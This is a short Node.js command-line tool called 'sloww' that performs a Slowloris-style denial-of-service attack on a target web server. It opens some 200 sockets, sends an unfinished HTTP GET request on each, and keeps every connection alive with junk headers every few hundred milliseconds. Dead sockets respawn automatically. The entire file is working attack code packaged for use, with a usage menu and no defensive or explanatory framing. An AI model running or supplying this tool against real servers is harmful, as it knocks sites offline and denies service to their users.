#!/usr/bin/env node

const net = require('net')
const opts = require('gar')(process.argv.slice(2))

if ((typeof opts.help === 'boolean' && opts.help === true) || (typeof opts.sockets !== 'number' && typeof opts.sockets !== 'undefined') || typeof opts.host !== 'string' || (typeof opts.port !== 'number' && typeof opts.port !== 'undefined') || (typeof opts.respawn !== 'boolean' && typeof opts.respawn !== 'undefined')) {
	console.error((typeof opts.help === 'boolean' ? '' : 'Invalid arguments. ') + 'Usage:\nsloww\n\t--host <required> string\n\t--port number - Default: 80\n\t--sockets number - Number of sockets to generate. Defaults to 200.\n\t--respawn boolean - Respawn dead sockets? Defaults to true.\n\t--rate number - Rate at which to send packets. (Milliseconds) Defaults to randomized 600-700.\n\t--help - Display this help menu')
	process.exit(0)
}

let activeSockets = 0

console.log(opts)

const addSocket = () => {
	let socket = new net.Socket()

	socket.connect(opts.port || 80, opts.host)

	let writeKeepAlive

	socket.on('connect', () => {
		socket.write('GET / HTTP/1.1\n', 'ascii', () => {
			console.log('Socket activated. (Total active: ' + activeSockets + ')')
			activeSockets++

			socket.write('Host: ' + opts.host + '\n')

			let sentPacketCount = 0
			let multiplier = Math.floor(Math.random() * 100)

			writeKeepAlive = () => {
				sentPacketCount++
				socket.write('sloww' + (sentPacketCount * multiplier) + ': ' + 'slowpacket' + (sentPacketCount * multiplier + 2) + '\n', () => {
					setTimeout(() => writeKeepAlive !== false ? writeKeepAlive() : null, (opts.rate || Math.floor(Math.random() * 100) + 600))
				})
			}

			writeKeepAlive()
		})

		socket.on('error', (err) => {
			console.log('Socket errorred. ' + err.message)
			socket.destroy()
		})

		socket.on('data', (data) => {
			console.log(data.toString())
		})

		socket.on('close', () => {
			activeSockets--
			writeKeepAlive = false

			if (opts.respawn || true) {
				console.log('Respawning dead socket...')
				addSocket()
			}
		})
	})
}

for (let i = 0; i <= (opts.sockets || 200); i++) {
	addSocket()
}